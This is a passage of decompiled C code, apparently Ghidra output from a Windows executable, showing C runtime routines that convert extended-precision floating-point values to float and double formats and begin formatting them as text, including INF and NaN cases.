    uVar8 = DAT_004236b8 & 0x8000001f;
    local_14 = iVar12;
    local_10 = iVar3;
    if ((int)uVar8 < 0) {
      uVar8 = (uVar8 - 1 | 0xffffffe0) + 1;
    }
    ppuVar7 = &local_24 + iVar3;
    bVar5 = (byte)(0x1f - uVar8);
    local_c = 0x1f - uVar8;
    if (((uint)*ppuVar7 & 1 << (bVar5 & 0x1f)) != 0) {
      puVar9 = (ushort *)((uint)(&local_24)[iVar3] & ~(-1 << (bVar5 & 0x1f)));
      while( true ) {
        if (puVar9 != (ushort *)0x0) {
          iVar3 = (int)(iVar14 + (iVar14 >> 0x1f & 0x1fU)) >> 5;
          local_8 = (ushort *)0x0;
          puVar9 = (ushort *)(1 << (0x1f - ((byte)iVar14 & 0x1f) & 0x1f));
          ppuVar6 = &local_24 + iVar3;
          param_1 = (ushort *)((int)*ppuVar6 + (int)puVar9);
          if (param_1 < *ppuVar6) goto LAB_00419c18;
          bVar15 = param_1 < puVar9;
          do {
            local_8 = (ushort *)0x0;
            if (!bVar15) goto LAB_00419c1f;
LAB_00419c18:
            do {
              local_8 = (ushort *)0x1;
LAB_00419c1f:
              iVar3 = iVar3 + -1;
              *ppuVar6 = param_1;
              if ((iVar3 < 0) || (local_8 == (ushort *)0x0)) {
                param_1 = local_8;
                goto LAB_00419c2d;
              }
              local_8 = (ushort *)0x0;
              ppuVar6 = &local_24 + iVar3;
              param_1 = (ushort *)((int)*ppuVar6 + 1);
            } while (param_1 < *ppuVar6);
            bVar15 = param_1 == (ushort *)0x0;
          } while( true );
        }
        iVar3 = iVar3 + 1;
        if (2 < iVar3) break;
        puVar9 = (&local_24)[iVar3];
      }
    }
LAB_00419c2d:
    *ppuVar7 = (ushort *)((uint)*ppuVar7 & -1 << ((byte)local_c & 0x1f));
    iVar3 = local_10 + 1;
    if (iVar3 < 3) {
      ppuVar7 = &local_24 + iVar3;
      for (iVar14 = 3 - iVar3; iVar14 != 0; iVar14 = iVar14 + -1) {
        *ppuVar7 = (ushort *)0x0;
        ppuVar7 = ppuVar7 + 1;
      }
    }
    if (param_1 != (ushort *)0x0) {
      iVar12 = uVar11 - 0x3ffe;
    }
    if (iVar12 < (int)(DAT_004236b4 - DAT_004236b8)) {
      local_24 = (ushort *)0x0;
      local_20 = 0;
    }
    else {
      if (DAT_004236b4 < iVar12) {
        if (iVar12 < DAT_004236b0) {
          local_24 = (ushort *)((uint)local_24 & 0x7fffffff);
          iVar12 = iVar12 + DAT_004236c4;
          iVar3 = (int)(DAT_004236bc + ((int)DAT_004236bc >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_004236bc & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          param_1 = (ushort *)0x0;
          local_8 = (ushort *)(0x20 - uVar13);
          do {
            local_14 = (uint)(&local_24)[(int)param_1] & ~(-1 << ((byte)uVar13 & 0x1f));
            (&local_24)[(int)param_1] =
                 (ushort *)((uint)(&local_24)[(int)param_1] >> ((byte)uVar13 & 0x1f) | local_10);
            param_1 = (ushort *)((int)param_1 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)param_1 < 3);
          iVar14 = 2;
          ppuVar7 = &local_1c + -iVar3;
          do {
            if (iVar14 < iVar3) {
              (&local_24)[iVar14] = (ushort *)0x0;
            }
            else {
              (&local_24)[iVar14] = *ppuVar7;
            }
            iVar14 = iVar14 + -1;
            ppuVar7 = ppuVar7 + -1;
          } while (-1 < iVar14);
          uVar4 = 0;
        }
        else {
          local_20 = 0;
          local_1c = (ushort *)0x0;
          local_24 = (ushort *)0x80000000;
          iVar12 = (int)(DAT_004236bc + ((int)DAT_004236bc >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_004236bc & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          param_1 = (ushort *)0x0;
          local_8 = (ushort *)(0x20 - uVar13);
          do {
            puVar2 = (&local_24)[(int)param_1];
            local_14 = (uint)puVar2 & ~(-1 << ((byte)uVar13 & 0x1f));
            (&local_24)[(int)param_1] = (ushort *)((uint)puVar2 >> ((byte)uVar13 & 0x1f) | local_10)
            ;
            param_1 = (ushort *)((int)param_1 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)param_1 < 3);
          iVar3 = 2;
          ppuVar7 = &local_1c + -iVar12;
          do {
            if (iVar3 < iVar12) {
              (&local_24)[iVar3] = (ushort *)0x0;
            }
            else {
              (&local_24)[iVar3] = *ppuVar7;
            }
            iVar3 = iVar3 + -1;
            ppuVar7 = ppuVar7 + -1;
          } while (-1 < iVar3);
          iVar12 = DAT_004236c4 + DAT_004236b0;
          uVar4 = 1;
        }
        goto LAB_00419fe4;
      }
      local_14 = DAT_004236b4 - local_14;
      local_24 = puVar2;
      local_20 = uVar13;
      iVar12 = (int)(local_14 + ((int)local_14 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = local_14 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      param_1 = (ushort *)0x0;
      local_8 = (ushort *)(0x20 - uVar13);
      do {
        puVar2 = (&local_24)[(int)param_1];
        local_14 = (uint)puVar2 & ~(-1 << ((byte)uVar13 & 0x1f));
        (&local_24)[(int)param_1] = (ushort *)((uint)puVar2 >> ((byte)uVar13 & 0x1f) | local_10);
        param_1 = (ushort *)((int)param_1 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)param_1 < 3);
      iVar3 = 2;
      ppuVar7 = &local_1c + -iVar12;
      do {
        if (iVar3 < iVar12) {
          (&local_24)[iVar3] = (ushort *)0x0;
        }
        else {
          (&local_24)[iVar3] = *ppuVar7;
        }
        iVar3 = iVar3 + -1;
        ppuVar7 = ppuVar7 + -1;
      } while (-1 < iVar3);
      iVar3 = DAT_004236b8 - 1;
      iVar12 = (int)(DAT_004236b8 + ((int)DAT_004236b8 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = DAT_004236b8 & 0x8000001f;
      local_10 = iVar12;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      bVar5 = (byte)(0x1f - uVar13);
      ppuVar7 = &local_24 + iVar12;
      local_14 = 0x1f - uVar13;
      if (((uint)*ppuVar7 & 1 << (bVar5 & 0x1f)) != 0) {
        puVar2 = (ushort *)((uint)(&local_24)[iVar12] & ~(-1 << (bVar5 & 0x1f)));
        while (puVar2 == (ushort *)0x0) {
          iVar12 = iVar12 + 1;
          if (2 < iVar12) goto LAB_00419dd0;
          puVar2 = (&local_24)[iVar12];
        }
        iVar12 = (int)(iVar3 + (iVar3 >> 0x1f & 0x1fU)) >> 5;
        bVar15 = false;
        puVar10 = (ushort *)(1 << (0x1f - ((byte)iVar3 & 0x1f) & 0x1f));
        puVar9 = (&local_24)[iVar12];
        puVar2 = (ushort *)((int)puVar9 + (int)puVar10);
        if ((puVar2 < puVar9) || (puVar2 < puVar10)) {
          bVar15 = true;
        }
        (&local_24)[iVar12] = puVar2;
        while ((iVar12 = iVar12 + -1, -1 < iVar12 && (bVar15))) {
          puVar9 = (&local_24)[iVar12];
          puVar2 = (ushort *)((int)puVar9 + 1);
          bVar15 = false;
          if ((puVar2 < puVar9) || (puVar2 == (ushort *)0x0)) {
            bVar15 = true;
          }
          (&local_24)[iVar12] = puVar2;
        }
      }
LAB_00419dd0:
      *ppuVar7 = (ushort *)((uint)*ppuVar7 & -1 << ((byte)local_14 & 0x1f));
      iVar12 = local_10 + 1;
      if (iVar12 < 3) {
        ppuVar7 = &local_24 + iVar12;
        for (iVar3 = 3 - iVar12; iVar3 != 0; iVar3 = iVar3 + -1) {
          *ppuVar7 = (ushort *)0x0;
          ppuVar7 = ppuVar7 + 1;
        }
      }
      uVar13 = DAT_004236bc + 1;
      iVar12 = (int)(uVar13 + ((int)uVar13 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = uVar13 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      param_1 = (ushort *)0x0;
      local_8 = (ushort *)(0x20 - uVar13);
      do {
        puVar2 = (&local_24)[(int)param_1];
        local_14 = (uint)puVar2 & ~(-1 << ((byte)uVar13 & 0x1f));
        (&local_24)[(int)param_1] = (ushort *)((uint)puVar2 >> ((byte)uVar13 & 0x1f) | local_10);
        param_1 = (ushort *)((int)param_1 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)param_1 < 3);
      iVar3 = 2;
      ppuVar7 = &local_1c + -iVar12;
      do {
        if (iVar3 < iVar12) {
          (&local_24)[iVar3] = (ushort *)0x0;
        }
        else {
          (&local_24)[iVar3] = *ppuVar7;
        }
        iVar3 = iVar3 + -1;
        ppuVar7 = ppuVar7 + -1;
      } while (-1 < iVar3);
    }
    iVar12 = 0;
    uVar4 = 2;
  }
LAB_00419fe4:
  uVar13 = iVar12 << (0x1fU - (char)DAT_004236bc & 0x1f) | -(uint)(local_18 != 0) & 0x80000000 |
           (uint)local_24;
  if (DAT_004236c0 == 0x40) {
    param_2[1] = uVar13;
    *param_2 = local_20;
  }
  else if (DAT_004236c0 == 0x20) {
    *param_2 = uVar13;
  }
  return uVar4;
}



undefined4 __cdecl FUN_0041a027(ushort *param_1,uint *param_2)

{
  ushort uVar1;
  ushort *puVar2;
  int iVar3;
  undefined4 uVar4;
  byte bVar5;
  ushort **ppuVar6;
  ushort **ppuVar7;
  uint uVar8;
  ushort *puVar9;
  ushort *puVar10;
  uint uVar11;
  int iVar12;
  uint uVar13;
  int iVar14;
  bool bVar15;
  ushort *local_24;
  uint local_20;
  ushort *local_1c;
  uint local_18;
  uint local_14;
  uint local_10;
  int local_c;
  ushort *local_8;
  
  local_18 = param_1[5] & 0x8000;
  puVar2 = *(ushort **)(param_1 + 3);
  local_24 = puVar2;
  uVar13 = *(uint *)(param_1 + 1);
  uVar1 = *param_1;
  uVar11 = param_1[5] & 0x7fff;
  iVar12 = uVar11 - 0x3fff;
  local_20 = uVar13;
  local_1c = (ushort *)((uint)uVar1 << 0x10);
  if (iVar12 == -0x3fff) {
    iVar12 = 0;
    iVar3 = 0;
    do {
      if ((&local_24)[iVar3] != (ushort *)0x0) {
        local_24 = (ushort *)0x0;
        local_20 = 0;
        uVar4 = 2;
        goto LAB_0041a528;
      }
      iVar3 = iVar3 + 1;
    } while (iVar3 < 3);
    uVar4 = 0;
  }
  else {
    param_1 = (ushort *)0x0;
    iVar14 = DAT_004236d0 - 1;
    iVar3 = (int)(DAT_004236d0 + ((int)DAT_004236d0 >> 0x1f & 0x1fU)) >> 5;
    uVar8 = DAT_004236d0 & 0x8000001f;
    local_14 = iVar12;
    local_10 = iVar3;
    if ((int)uVar8 < 0) {
      uVar8 = (uVar8 - 1 | 0xffffffe0) + 1;
    }
    ppuVar7 = &local_24 + iVar3;
    bVar5 = (byte)(0x1f - uVar8);
    local_c = 0x1f - uVar8;
    if (((uint)*ppuVar7 & 1 << (bVar5 & 0x1f)) != 0) {
      puVar9 = (ushort *)((uint)(&local_24)[iVar3] & ~(-1 << (bVar5 & 0x1f)));
      while( true ) {
        if (puVar9 != (ushort *)0x0) {
          iVar3 = (int)(iVar14 + (iVar14 >> 0x1f & 0x1fU)) >> 5;
          local_8 = (ushort *)0x0;
          puVar9 = (ushort *)(1 << (0x1f - ((byte)iVar14 & 0x1f) & 0x1f));
          ppuVar6 = &local_24 + iVar3;
          param_1 = (ushort *)((int)*ppuVar6 + (int)puVar9);
          if (param_1 < *ppuVar6) goto LAB_0041a15c;
          bVar15 = param_1 < puVar9;
          do {
            local_8 = (ushort *)0x0;
            if (!bVar15) goto LAB_0041a163;
LAB_0041a15c:
            do {
              local_8 = (ushort *)0x1;
LAB_0041a163:
              iVar3 = iVar3 + -1;
              *ppuVar6 = param_1;
              if ((iVar3 < 0) || (local_8 == (ushort *)0x0)) {
                param_1 = local_8;
                goto LAB_0041a171;
              }
              local_8 = (ushort *)0x0;
              ppuVar6 = &local_24 + iVar3;
              param_1 = (ushort *)((int)*ppuVar6 + 1);
            } while (param_1 < *ppuVar6);
            bVar15 = param_1 == (ushort *)0x0;
          } while( true );
        }
        iVar3 = iVar3 + 1;
        if (2 < iVar3) break;
        puVar9 = (&local_24)[iVar3];
      }
    }
LAB_0041a171:
    *ppuVar7 = (ushort *)((uint)*ppuVar7 & -1 << ((byte)local_c & 0x1f));
    iVar3 = local_10 + 1;
    if (iVar3 < 3) {
      ppuVar7 = &local_24 + iVar3;
      for (iVar14 = 3 - iVar3; iVar14 != 0; iVar14 = iVar14 + -1) {
        *ppuVar7 = (ushort *)0x0;
        ppuVar7 = ppuVar7 + 1;
      }
    }
    if (param_1 != (ushort *)0x0) {
      iVar12 = uVar11 - 0x3ffe;
    }
    if (iVar12 < (int)(DAT_004236cc - DAT_004236d0)) {
      local_24 = (ushort *)0x0;
      local_20 = 0;
    }
    else {
      if (DAT_004236cc < iVar12) {
        if (iVar12 < DAT_004236c8) {
          local_24 = (ushort *)((uint)local_24 & 0x7fffffff);
          iVar12 = iVar12 + DAT_004236dc;
          iVar3 = (int)(DAT_004236d4 + ((int)DAT_004236d4 >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_004236d4 & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          param_1 = (ushort *)0x0;
          local_8 = (ushort *)(0x20 - uVar13);
          do {
            local_14 = (uint)(&local_24)[(int)param_1] & ~(-1 << ((byte)uVar13 & 0x1f));
            (&local_24)[(int)param_1] =
                 (ushort *)((uint)(&local_24)[(int)param_1] >> ((byte)uVar13 & 0x1f) | local_10);
            param_1 = (ushort *)((int)param_1 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)param_1 < 3);
          iVar14 = 2;
          ppuVar7 = &local_1c + -iVar3;
          do {
            if (iVar14 < iVar3) {
              (&local_24)[iVar14] = (ushort *)0x0;
            }
            else {
              (&local_24)[iVar14] = *ppuVar7;
            }
            iVar14 = iVar14 + -1;
            ppuVar7 = ppuVar7 + -1;
          } while (-1 < iVar14);
          uVar4 = 0;
        }
        else {
          local_20 = 0;
          local_1c = (ushort *)0x0;
          local_24 = (ushort *)0x80000000;
          iVar12 = (int)(DAT_004236d4 + ((int)DAT_004236d4 >> 0x1f & 0x1fU)) >> 5;
          uVar13 = DAT_004236d4 & 0x8000001f;
          if ((int)uVar13 < 0) {
            uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
          }
          local_10 = 0;
          param_1 = (ushort *)0x0;
          local_8 = (ushort *)(0x20 - uVar13);
          do {
            puVar2 = (&local_24)[(int)param_1];
            local_14 = (uint)puVar2 & ~(-1 << ((byte)uVar13 & 0x1f));
            (&local_24)[(int)param_1] = (ushort *)((uint)puVar2 >> ((byte)uVar13 & 0x1f) | local_10)
            ;
            param_1 = (ushort *)((int)param_1 + 1);
            local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
          } while ((int)param_1 < 3);
          iVar3 = 2;
          ppuVar7 = &local_1c + -iVar12;
          do {
            if (iVar3 < iVar12) {
              (&local_24)[iVar3] = (ushort *)0x0;
            }
            else {
              (&local_24)[iVar3] = *ppuVar7;
            }
            iVar3 = iVar3 + -1;
            ppuVar7 = ppuVar7 + -1;
          } while (-1 < iVar3);
          iVar12 = DAT_004236dc + DAT_004236c8;
          uVar4 = 1;
        }
        goto LAB_0041a528;
      }
      local_14 = DAT_004236cc - local_14;
      local_24 = puVar2;
      local_20 = uVar13;
      iVar12 = (int)(local_14 + ((int)local_14 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = local_14 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      param_1 = (ushort *)0x0;
      local_8 = (ushort *)(0x20 - uVar13);
      do {
        puVar2 = (&local_24)[(int)param_1];
        local_14 = (uint)puVar2 & ~(-1 << ((byte)uVar13 & 0x1f));
        (&local_24)[(int)param_1] = (ushort *)((uint)puVar2 >> ((byte)uVar13 & 0x1f) | local_10);
        param_1 = (ushort *)((int)param_1 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)param_1 < 3);
      iVar3 = 2;
      ppuVar7 = &local_1c + -iVar12;
      do {
        if (iVar3 < iVar12) {
          (&local_24)[iVar3] = (ushort *)0x0;
        }
        else {
          (&local_24)[iVar3] = *ppuVar7;
        }
        iVar3 = iVar3 + -1;
        ppuVar7 = ppuVar7 + -1;
      } while (-1 < iVar3);
      iVar3 = DAT_004236d0 - 1;
      iVar12 = (int)(DAT_004236d0 + ((int)DAT_004236d0 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = DAT_004236d0 & 0x8000001f;
      local_10 = iVar12;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      bVar5 = (byte)(0x1f - uVar13);
      ppuVar7 = &local_24 + iVar12;
      local_14 = 0x1f - uVar13;
      if (((uint)*ppuVar7 & 1 << (bVar5 & 0x1f)) != 0) {
        puVar2 = (ushort *)((uint)(&local_24)[iVar12] & ~(-1 << (bVar5 & 0x1f)));
        while (puVar2 == (ushort *)0x0) {
          iVar12 = iVar12 + 1;
          if (2 < iVar12) goto LAB_0041a314;
          puVar2 = (&local_24)[iVar12];
        }
        iVar12 = (int)(iVar3 + (iVar3 >> 0x1f & 0x1fU)) >> 5;
        bVar15 = false;
        puVar10 = (ushort *)(1 << (0x1f - ((byte)iVar3 & 0x1f) & 0x1f));
        puVar9 = (&local_24)[iVar12];
        puVar2 = (ushort *)((int)puVar9 + (int)puVar10);
        if ((puVar2 < puVar9) || (puVar2 < puVar10)) {
          bVar15 = true;
        }
        (&local_24)[iVar12] = puVar2;
        while ((iVar12 = iVar12 + -1, -1 < iVar12 && (bVar15))) {
          puVar9 = (&local_24)[iVar12];
          puVar2 = (ushort *)((int)puVar9 + 1);
          bVar15 = false;
          if ((puVar2 < puVar9) || (puVar2 == (ushort *)0x0)) {
            bVar15 = true;
          }
          (&local_24)[iVar12] = puVar2;
        }
      }
LAB_0041a314:
      *ppuVar7 = (ushort *)((uint)*ppuVar7 & -1 << ((byte)local_14 & 0x1f));
      iVar12 = local_10 + 1;
      if (iVar12 < 3) {
        ppuVar7 = &local_24 + iVar12;
        for (iVar3 = 3 - iVar12; iVar3 != 0; iVar3 = iVar3 + -1) {
          *ppuVar7 = (ushort *)0x0;
          ppuVar7 = ppuVar7 + 1;
        }
      }
      uVar13 = DAT_004236d4 + 1;
      iVar12 = (int)(uVar13 + ((int)uVar13 >> 0x1f & 0x1fU)) >> 5;
      uVar13 = uVar13 & 0x8000001f;
      if ((int)uVar13 < 0) {
        uVar13 = (uVar13 - 1 | 0xffffffe0) + 1;
      }
      local_10 = 0;
      param_1 = (ushort *)0x0;
      local_8 = (ushort *)(0x20 - uVar13);
      do {
        puVar2 = (&local_24)[(int)param_1];
        local_14 = (uint)puVar2 & ~(-1 << ((byte)uVar13 & 0x1f));
        (&local_24)[(int)param_1] = (ushort *)((uint)puVar2 >> ((byte)uVar13 & 0x1f) | local_10);
        param_1 = (ushort *)((int)param_1 + 1);
        local_10 = local_14 << ((byte)(0x20 - uVar13) & 0x1f);
      } while ((int)param_1 < 3);
      iVar3 = 2;
      ppuVar7 = &local_1c + -iVar12;
      do {
        if (iVar3 < iVar12) {
          (&local_24)[iVar3] = (ushort *)0x0;
        }
        else {
          (&local_24)[iVar3] = *ppuVar7;
        }
        iVar3 = iVar3 + -1;
        ppuVar7 = ppuVar7 + -1;
      } while (-1 < iVar3);
    }
    iVar12 = 0;
    uVar4 = 2;
  }
LAB_0041a528:
  uVar13 = iVar12 << (0x1fU - (char)DAT_004236d4 & 0x1f) | -(uint)(local_18 != 0) & 0x80000000 |
           (uint)local_24;
  if (DAT_004236d8 == 0x40) {
    param_2[1] = uVar13;
    *param_2 = local_20;
  }
  else if (DAT_004236d8 == 0x20) {
    *param_2 = uVar13;
  }
  return uVar4;
}



// WARNING: Removing unreachable block (ram,0x0041a82d)
// WARNING: Removing unreachable block (ram,0x0041a7f6)
// WARNING: Removing unreachable block (ram,0x0041abde)
// WARNING: Removing unreachable block (ram,0x0041a805)
// WARNING: Removing unreachable block (ram,0x0041a80d)
// WARNING: Removing unreachable block (ram,0x0041a813)
// WARNING: Removing unreachable block (ram,0x0041a816)
// WARNING: Removing unreachable block (ram,0x0041a81d)
// WARNING: Removing unreachable block (ram,0x0041a827)
// WARNING: Removing unreachable block (ram,0x0041a882)
// WARNING: Removing unreachable block (ram,0x0041a87c)
// WARNING: Removing unreachable block (ram,0x0041a888)
// WARNING: Removing unreachable block (ram,0x0041a8a5)
// WARNING: Removing unreachable block (ram,0x0041a8a7)
// WARNING: Removing unreachable block (ram,0x0041a8af)
// WARNING: Removing unreachable block (ram,0x0041a8b2)
// WARNING: Removing unreachable block (ram,0x0041a8b7)
// WARNING: Removing unreachable block (ram,0x0041a8ba)
// WARNING: Removing unreachable block (ram,0x0041abe7)
// WARNING: Removing unreachable block (ram,0x0041a8c5)
// WARNING: Removing unreachable block (ram,0x0041abfe)
// WARNING: Removing unreachable block (ram,0x0041ac05)
// WARNING: Removing unreachable block (ram,0x0041a8d0)
// WARNING: Removing unreachable block (ram,0x0041a8e3)
// WARNING: Removing unreachable block (ram,0x0041a8e5)
// WARNING: Removing unreachable block (ram,0x0041a8f2)
// WARNING: Removing unreachable block (ram,0x0041a8f7)
// WARNING: Removing unreachable block (ram,0x0041a8fd)
// WARNING: Removing unreachable block (ram,0x0041a906)
// WARNING: Removing unreachable block (ram,0x0041a90d)
// WARNING: Removing unreachable block (ram,0x0041a925)
// WARNING: Removing unreachable block (ram,0x0041a936)
// WARNING: Removing unreachable block (ram,0x0041a944)
// WARNING: Removing unreachable block (ram,0x0041a983)
// WARNING: Removing unreachable block (ram,0x0041a98c)
// WARNING: Removing unreachable block (ram,0x0041aba4)
// WARNING: Removing unreachable block (ram,0x0041a99a)
// WARNING: Removing unreachable block (ram,0x0041a9a4)
// WARNING: Removing unreachable block (ram,0x0041abbf)
// WARNING: Removing unreachable block (ram,0x0041a9b1)
// WARNING: Removing unreachable block (ram,0x0041a9b8)
// WARNING: Removing unreachable block (ram,0x0041a9c2)
// WARNING: Removing unreachable block (ram,0x0041a9c7)
// WARNING: Removing unreachable block (ram,0x0041a9d7)
// WARNING: Removing unreachable block (ram,0x0041a9dc)
// WARNING: Removing unreachable block (ram,0x0041a9e6)
// WARNING: Removing unreachable block (ram,0x0041a9eb)
// WARNING: Removing unreachable block (ram,0x0041a9fd)
// WARNING: Removing unreachable block (ram,0x0041aa0a)
// WARNING: Removing unreachable block (ram,0x0041aa19)
// WARNING: Removing unreachable block (ram,0x0041aa26)
// WARNING: Removing unreachable block (ram,0x0041aa43)
// WARNING: Removing unreachable block (ram,0x0041aa47)
// WARNING: Removing unreachable block (ram,0x0041aa4e)
// WARNING: Removing unreachable block (ram,0x0041aa57)
// WARNING: Removing unreachable block (ram,0x0041aa5a)
// WARNING: Removing unreachable block (ram,0x0041aa6b)
// WARNING: Removing unreachable block (ram,0x0041aa79)
// WARNING: Removing unreachable block (ram,0x0041aa84)
// WARNING: Removing unreachable block (ram,0x0041aa8b)
// WARNING: Removing unreachable block (ram,0x0041aab6)
// WARNING: Removing unreachable block (ram,0x0041aabb)
// WARNING: Removing unreachable block (ram,0x0041aac6)
// WARNING: Removing unreachable block (ram,0x0041aacf)
// WARNING: Removing unreachable block (ram,0x0041aad5)
// WARNING: Removing unreachable block (ram,0x0041aad8)
// WARNING: Removing unreachable block (ram,0x0041aafe)
// WARNING: Removing unreachable block (ram,0x0041ab03)
// WARNING: Removing unreachable block (ram,0x0041ab08)
// WARNING: Removing unreachable block (ram,0x0041ab15)
// WARNING: Removing unreachable block (ram,0x0041ab26)
// WARNING: Removing unreachable block (ram,0x0041ab57)
// WARNING: Removing unreachable block (ram,0x0041ab2c)
// WARNING: Removing unreachable block (ram,0x0041ab52)
// WARNING: Removing unreachable block (ram,0x0041ab36)
// WARNING: Removing unreachable block (ram,0x0041ab4c)
// WARNING: Removing unreachable block (ram,0x0041ab45)
// WARNING: Removing unreachable block (ram,0x0041ab5a)
// WARNING: Removing unreachable block (ram,0x0041ab87)
// WARNING: Removing unreachable block (ram,0x0041ab64)
// WARNING: Removing unreachable block (ram,0x0041a9ef)
// WARNING: Removing unreachable block (ram,0x0041a9cc)
// WARNING: Removing unreachable block (ram,0x0041abc2)
// WARNING: Removing unreachable block (ram,0x0041a908)
// WARNING: Removing unreachable block (ram,0x0041abcc)
// WARNING: Removing unreachable block (ram,0x0041ac0d)

void __cdecl
FUN_0041a56b(undefined2 *param_1,char **param_2,char *param_3,int param_4,int param_5,int param_6,
            undefined4 param_7,int param_8)

{
  char cVar1;
  uint uVar2;
  undefined4 *puVar3;
  undefined4 extraout_EDX;
  
  uVar2 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  if (param_8 == 0) {
    puVar3 = (undefined4 *)FUN_0040caaa();
    *puVar3 = 0x16;
    FUN_0040ca42();
    FUN_0040a982(uVar2 ^ (uint)&stack0xfffffffc,extraout_EDX);
    return;
  }
  for (; (((cVar1 = *param_3, cVar1 == ' ' || (cVar1 == '\t')) || (cVar1 == '\n')) ||
         (cVar1 == '\r')); param_3 = param_3 + 1) {
  }
                    // WARNING: Could not recover jumptable at 0x0041a5fe. Too many branches
                    // WARNING: Treating indirect jump as call
  (*DAT_0041ac33)();
  return;
}



// WARNING: Removing unreachable block (ram,0x0041b19e)
// WARNING: Removing unreachable block (ram,0x0041b1a8)
// WARNING: Removing unreachable block (ram,0x0041b1ad)

void __cdecl
FUN_0041ac63(int param_1,uint param_2,ushort param_3,int param_4,byte param_5,short *param_6)

{
  short *psVar1;
  int *piVar2;
  int iVar3;
  int iVar4;
  bool bVar5;
  int iVar6;
  ushort *puVar7;
  ushort uVar8;
  ushort uVar9;
  int *piVar10;
  int iVar11;
  char cVar12;
  ushort uVar13;
  uint uVar14;
  short *extraout_EDX;
  short *extraout_EDX_00;
  short *extraout_EDX_01;
  short *extraout_EDX_02;
  short *psVar15;
  uint uVar16;
  short *psVar17;
  short *psVar18;
  ushort uVar19;
  ushort uVar20;
  int iVar21;
  uint uVar22;
  uint uVar23;
  uint uVar24;
  undefined4 *puVar25;
  char *pcVar26;
  ushort *local_70;
  int *local_6c;
  undefined *local_68;
  int local_5c;
  int local_58;
  int local_54;
  short local_50;
  ushort *local_4c;
  int local_48;
  int local_44;
  undefined2 local_40;
  undefined4 uStack_3e;
  ushort uStack_3a;
  int local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined local_2c;
  undefined uStack_2b;
  undefined uStack_2a;
  undefined uStack_29;
  undefined4 local_24;
  ushort uStack_20;
  ushort uStack_1e;
  ushort uStack_1c;
  undefined local_1a;
  byte bStack_19;
  byte local_14;
  undefined uStack_13;
  ushort uStack_12;
  undefined4 local_10;
  ushort local_c;
  ushort uStack_a;
  uint local_8;
  
  uVar16 = CONCAT22(local_24._2_2_,(undefined2)local_24);
  iVar3 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
  iVar6 = CONCAT22(uStack_3e._2_2_,(undefined2)uStack_3e);
  local_8 = DAT_00422044 ^ (uint)&stack0xfffffffc;
  local_14 = (byte)param_1;
  uStack_13 = (undefined)((uint)param_1 >> 8);
  uStack_12 = (ushort)((uint)param_1 >> 0x10);
  local_10._0_2_ = (ushort)param_2;
  iVar21 = CONCAT22((ushort)local_10,uStack_12);
  local_10._2_2_ = (ushort)(param_2 >> 0x10);
  local_c = param_3;
  uVar8 = param_3 & 0x8000;
  uVar14 = param_3 & 0x7fff;
  local_34 = 0xcccccccc;
  local_30 = 0xcccccccc;
  local_2c = 0xcc;
  uStack_2b = 0xcc;
  uStack_2a = 0xfb;
  uStack_29 = 0x3f;
  if (uVar8 == 0) {
    *(undefined *)(param_6 + 1) = 0x20;
  }
  else {
    *(undefined *)(param_6 + 1) = 0x2d;
  }
  if ((((short)uVar14 == 0) && (param_2 == 0)) && (param_1 == 0)) {
    *param_6 = 0;
    *(byte *)(param_6 + 1) = ((uVar8 != 0x8000) - 1U & 0xd) + 0x20;
    *(undefined *)((int)param_6 + 3) = 1;
    *(undefined *)(param_6 + 2) = 0x30;
    *(undefined *)((int)param_6 + 5) = 0;
    psVar15 = (short *)0x0;
    iVar6 = iVar3;
    goto LAB_0041b53b;
  }
  if ((short)uVar14 == 0x7fff) {
    *param_6 = 1;
    if (((param_2 == 0x80000000) && (param_1 == 0)) || ((param_2 & 0x40000000) != 0)) {
      if ((uVar8 == 0) || (param_2 != 0xc0000000)) {
        if ((param_2 != 0x80000000) || (param_1 != 0)) goto LAB_0041ad99;
        pcVar26 = s_1_INF_004200b0;
      }
      else {
        if (param_1 != 0) {
LAB_0041ad99:
          pcVar26 = s_1_QNAN_004200a8;
          goto LAB_0041ad9e;
        }
        pcVar26 = s_1_IND_004200b8;
      }
      iVar6 = FUN_0040bcd6((char *)(param_6 + 2),0x16,pcVar26);
      psVar15 = extraout_EDX;
      if (iVar6 != 0) {
        FUN_0040c91a();
        psVar15 = extraout_EDX_00;
      }
      *(undefined *)((int)param_6 + 3) = 5;
    }
    else {
      pcVar26 = s_1_SNAN_004200c0;
